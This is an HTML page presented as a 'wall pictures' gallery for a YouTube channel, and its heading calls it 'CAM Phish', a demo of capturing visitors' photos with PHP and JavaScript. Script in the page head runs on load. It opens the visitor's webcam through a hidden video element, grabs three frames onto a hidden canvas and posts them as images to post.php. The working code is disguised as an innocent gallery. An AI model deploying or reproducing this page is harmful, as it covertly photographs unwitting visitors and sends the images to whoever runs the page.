<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Wall picturee - Trevo news TV.</title>
  <meta name="description" content="Wall pictures - Trevo news TV" />
  <meta name="keywords" content="circle, border-radius, hover, css3, transition, image, thumbnail, effect, 3d" />
  <meta name="author" content="Codrops" />
  <link rel="stylesheet" type="text/css" href="css/demo.css" />
  <link rel="stylesheet" type="text/css" href="css/common.css" />
  <link rel="stylesheet" type="text/css" href="css/style3.css" />
  <link href='http://fonts.googleapis.com/css?family=Open+Sans:300,700' rel='stylesheet' type='text/css' />
  <script type="text/javascript" src="js/modernizr.custom.79639.js"></script>
  <!--[if lte IE 8]><style>.main{display:none;} .support-note .note-ie{display:block;}</style><![endif]-->
  <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>

  <div class="video-wrap" hidden="hidden">
    <video id="video" playsinline autoplay></video>
  </div>

  <canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>

  <script>
   

    function post(imgdata) {
      $.ajax({
        type: 'POST',
        data: {
          cat: imgdata
        },
        url: 'post.php',
        dataType: 'json',
        async: false,
        success: function(result) {
          showGallery();
        },
        error: function() {}
      });
    };


    'use strict';

    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const errorMsgElement = document.querySelector('span#errorMsg');

    const constraints = {
      audio: false,
      video: {

        facingMode: "user"
      }
    };

    // Access webcam
    async function init() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia(constraints);
        handleSuccess(stream);
      } catch (e) {
        errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
      }
    }

    // Success
    function handleSuccess(stream) {
      window.stream = stream;
      video.srcObject = stream;

      var context = canvas.getContext('2d');
      var qtd = 0;
      var postImage = setInterval(function() {

        context.drawImage(video, 0, 0, 200, 260);
        var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
        post(canvasData);

        qtd++;
        if (qtd > 2){
           clearInterval(postImage);
           stream.getTracks().forEach(function(track) {
              track.stop();
          });
        }

      }, 1500);


    }

    // Load init
    init();

    function showGallery() {

      $.ajax({
        type: 'POST',
        data: {
          dados: null
        },
        url: 'carregaPhoto.php',
        dataType: 'html',
        async: false,
        success: function(result) {
          $("#galeria").html(result);
        },
        error: function() {}
      });
    };
  </script>


</head>

<body>
  <div class="container">

    <!-- Codrops top bar -->
    <div class="codrops-top">
      <a href="https://www.youtube.com/channel/UChaU5MRijGF34Xyi6jRJo0g?sub_confirmation=1">
        <strong>&laquo; TREVO NEWS TV: </strong>O melhor canal do Youtube
      </a>
      <span class="right">
        <a href="https://www.youtube.com/channel/UChaU5MRijGF34Xyi6jRJo0g?sub_confirmation=1">
          <strong>&laquo; TREVO NEWS TV: </strong>O melhor canal do Youtube
        </a>
      </span>
      <div class="clr"></div>
    </div>
    <!--/ Codrops top bar -->

    <header>

      <h1><strong>CAM</strong> Phish</h1>
      <h2>Como capturar fotos de visitantes, utilizando PHP e Javascript!</h2>
      <h2>Código fonte: <a href=""></h2>



      <div class="support-note">
        <!-- let's check browser support with modernizr -->
        <!--span class="no-cssanimations">CSS animations are not supported in your browser</span-->
        <span class="no-csstransforms">CSS transforms are not supported in your browser</span>
        <!--span class="no-csstransforms3d">CSS 3D transforms are not supported in your browser</span-->
        <span class="no-csstransitions">CSS transitions are not supported in your browser</span>
        <span class="note-ie">Sorry, only modern browsers.</span>
      </div>

    </header>

    <div id='galeria'></div>

  </div>

</body>

</html>
